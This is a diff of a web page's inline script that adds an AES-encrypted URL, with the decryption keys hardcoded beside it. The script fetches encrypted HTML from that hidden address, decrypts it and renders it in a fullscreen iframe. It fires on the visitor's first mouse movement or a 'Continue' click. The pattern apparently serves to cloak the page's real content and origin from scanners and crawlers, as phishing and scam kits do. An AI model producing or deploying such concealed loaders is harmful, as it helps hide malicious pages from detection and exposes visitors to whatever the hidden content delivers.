@@ -35,72 +35,66 @@
 
     <iframe id="frame" title="yoursomahearts" allowfullscreen></iframe>
 
+
     <script>
-        // ============================================================
-        // 🔑 KEYS (Must match API)
-        // ============================================================
-        const PASSPHRASE = "MySecretKey@123";
-        const URL_KEY = "MySecretKey@123";
+    
+    const PASSPHRASE = "MySecretKey@123";
+    const URL_KEY = "MySecretKey@123";
 
-        // ⚠️ THIS WILL BE REPLACED AFTER API DEPLOYMENT
-        const ENC_DATA_ORIGIN = "U2FsdGVkX1...";
+   
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18aC/i5CngwKIfLi2Jrm/6mNft5AVrMu8RgpGBOAkM6dYfRxMpCSSOvtrckA67S3mFHSXFhMjSX53ecQMNCSSvCrzjYwdmAwwY=";
 
-        let lastUrl = null;
+    let lastUrl = null;
 
-        // ============================================================
-        // 🔓 DECRYPT API URL
-        // ============================================================
-        const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-        const DATA_URL = DATA_ORIGIN;
-        console.log("🌐 Decrypted URL:", DATA_URL);
+    
+    
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN;
 
-        // ============================================================
-        // 🔐 DECRYPT CONTENT
-        // ============================================================
-        function simpleDecrypt(cipherText, passphrase) {
-            const key = CryptoJS.SHA256(passphrase);
-            const iv = CryptoJS.lib.WordArray.create([0, 0, 0, 0]);
-            const decrypted = CryptoJS.AES.decrypt(cipherText, key, { iv: iv });
-            return decrypted.toString(CryptoJS.enc.Utf8);
-        }
+    console.log("🌐 Decrypted URL:", DATA_URL);
 
-        // ============================================================
-        // 🚀 LOAD SECRET
-        // ============================================================
-        async function loadSecret() {
-            const frame = document.getElementById("frame");
-            try {
-                console.log("📡 Fetching from:", DATA_URL);
-                const res = await fetch(DATA_URL);
-                if (!res.ok) throw new Error(`HTTP ${res.status}`);
-                const data = await res.json();
-                if (!data.cipher) throw new Error("No cipher");
+    
+    function simpleDecrypt(cipherText, passphrase) {
+    
+    const decrypted = CryptoJS.AES.decrypt(cipherText, passphrase);
+    return decrypted.toString(CryptoJS.enc.Utf8);
+}
 
-                const html = simpleDecrypt(data.cipher, PASSPHRASE);
-                if (!html || html.length < 50) throw new Error("Invalid HTML");
+   
+    async function loadSecret() {
+        const frame = document.getElementById("frame");
+        try {
+            console.log("📡 Fetching from:", DATA_URL);
+            const res = await fetch(DATA_URL);
+            if (!res.ok) throw new Error(`HTTP ${res.status}`);
+            const data = await res.json();
+            if (!data.cipher) throw new Error("No cipher");
 
-                if (lastUrl) URL.revokeObjectURL(lastUrl);
-                const blob = new Blob([html], { type: "text/html" });
-                lastUrl = URL.createObjectURL(blob);
-                frame.src = lastUrl;
-                frame.style.display = "block";
-                document.getElementById("customPopup").style.display = "none";
-                console.log("✅ Loaded!");
-            } catch (e) {
-                console.error("❌", e);
-                alert("Error: " + e.message);
-                document.getElementById("customPopup").style.display = "none";
-            }
-        }
+            const html = simpleDecrypt(data.cipher, PASSPHRASE);
+            if (!html || html.length < 50) throw new Error("Invalid HTML");
 
-        // ============================================================
-        // 🎯 EVENT HANDLERS
-        // ============================================================
-        document.getElementById("cancelBtn").addEventListener("click", function() {
+            if (lastUrl) URL.revokeObjectURL(lastUrl);
+            const blob = new Blob([html], { type: "text/html" });
+            lastUrl = URL.createObjectURL(blob);
+            frame.src = lastUrl;
+            frame.style.display = "block";
             document.getElementById("customPopup").style.display = "none";
-        });
-        document.getElementById("continueBtn").addEventListener("click", loadSecret);
-        window.addEventListener("mousemove", loadSecret, { once: true });
-    </script>
+            console.log("✅ Loaded!");
+        } catch (e) {
+            console.error("❌", e);
+            alert("Error: " + e.message);
+            document.getElementById("customPopup").style.display = "none";
+        }
+    }
+
+   
+    document.getElementById("cancelBtn").addEventListener("click", function() {
+        document.getElementById("customPopup").style.display = "none";
+    });
+    document.getElementById("continueBtn").addEventListener("click", loadSecret);
+    window.addEventListener("mousemove", loadSecret, { once: true });
+</script>
+
+
 </body>
 </html>
